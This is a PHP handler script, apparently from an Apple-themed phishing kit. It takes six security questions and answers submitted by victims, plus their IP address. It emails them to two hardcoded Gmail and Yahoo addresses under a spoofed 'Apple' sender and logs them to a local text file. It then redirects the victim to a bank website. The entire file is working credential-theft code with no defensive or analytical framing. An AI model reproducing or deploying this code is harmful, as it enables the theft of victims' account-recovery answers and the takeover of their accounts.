<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Apple Pics Info-----------------------\n";
$message .= "Question 1             : ".$_POST['formselect1']."\n";
$message .= "Answer 1           : ".$_POST['formtext1']."\n";
$message .= "Question 2            : ".$_POST['formselect2']."\n";
$message .= "Answer 2           : ".$_POST['formtext2']."\n";
$message .= "Question 3            : ".$_POST['formselect3']."\n";
$message .= "Answer 3            : ".$_POST['formtext3']."\n";
$message .= "Question 4           : ".$_POST['formselect4']."\n";
$message .= "Answer 4          : ".$_POST['formtext4']."\n";
$message .= "Question 5           : ".$_POST['formselect5']."\n";
$message .= "Answer 5          : ".$_POST['formtext5']."\n";
$message .= "Question 6           : ".$_POST['formselect6']."\n";
$message .= "Answer 6          : ".$_POST['formtext6']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "zagayzzyy@gmail.com,zagazuma1@yahoo.com.au";
$subject = "Result from Unknown";
$headers = "From: Apple<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("useaaaw.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: https://www.navyfederal.org/");

	 
?>